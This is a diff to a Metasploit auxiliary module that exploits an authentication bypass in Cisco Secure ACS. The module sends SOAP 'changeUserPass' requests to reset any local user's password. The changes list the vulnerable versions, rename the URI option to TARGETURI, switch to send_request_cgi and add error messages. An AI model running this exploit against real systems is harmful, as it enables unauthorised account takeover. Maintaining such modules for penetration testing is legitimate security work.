@@ -19,11 +19,13 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'         => 'Cisco Secure ACS Unauthorized Password Change',
+			'Name'         => 'Cisco Secure ACS Version < 5.1.0.44.5 or 5.2.0.26.2 and Unauthorized Password Change',
 			'Version'      => '$Revision$',
 			'Description'  => %q{
-				This module exploits an authentication bypass issue which allows arbitrary password
-				change requests to be issued for any user in the local store.
+				This module exploits an authentication bypass issue which allows arbitrary 
+				password change requests to be issued for any user in the local store.  
+				Instances of Secure ACS running version 5.1 with patches 3, 4, or 5 as well 
+				as version 5.2 with either no patches or patches 1 and 2 are vulnerable. 
 				},
 			'References'     =>
 				[
@@ -33,8 +35,7 @@ class Metasploit4 < Msf::Auxiliary
 				],
 			'Author'         =>
 				[
-					'Jason Kratzer',
-					'www.flinkd.org'
+					'Jason Kratzer<pyoor[at]flinkd.org>',
 				],
 			'License'      => MSF_LICENSE
 		)
@@ -42,7 +43,7 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(443),
-				OptString.new('URI', [false, 'Path to UCP WebService', '/PI/services/UCP/']),
+				OptString.new('TARGETURI', [true, 'Path to UCP WebService', '/PI/services/UCP/']),
 				OptString.new('USERNAME', [true, 'Username to use', '']),
 				OptString.new('PASSWORD', [true, 'Password to use', '']),
 				OptBool.new('SSL', [true, 'Use SSL', true],),
@@ -78,15 +79,13 @@ class Metasploit4 < Msf::Auxiliary
 		print_status("Issuing password change request for: " + datastore['USERNAME'])
 
 		begin
-			res = send_request_raw({
-				'uri'     => "/#{datastore['URI']}",
+			res = send_request_cgi({
+				'uri'     => "#{datastore['TARGETURI']}",
 				'method'  => 'POST',
 				'data'    => data,
 				'headers' =>
 					{
-						'Content-Length'  => data.length,
 						'SOAPAction'      => '"changeUserPass"',
-						'Content-Type'    => 'text/xml; charset=UTF-8',
 					}
 			}, 60)
 
@@ -109,8 +108,11 @@ class Metasploit4 < Msf::Auxiliary
 				print_error("#{rhost} - Failed! Either the username does not exist or target is not vulnerable.")
 				print_error("Please change the username and try again.")
 			else
-				print_error("#{rhost} - Failed! An unexpected error has occurred.")
+				print_error("Fail")
 			end
+		else
+			print_error("#{rhost} - Failed! The webserver issued a #{res.code} response.")
+			print_error("Please validate the TARGETURI and try again.")
 		end
 
 	end
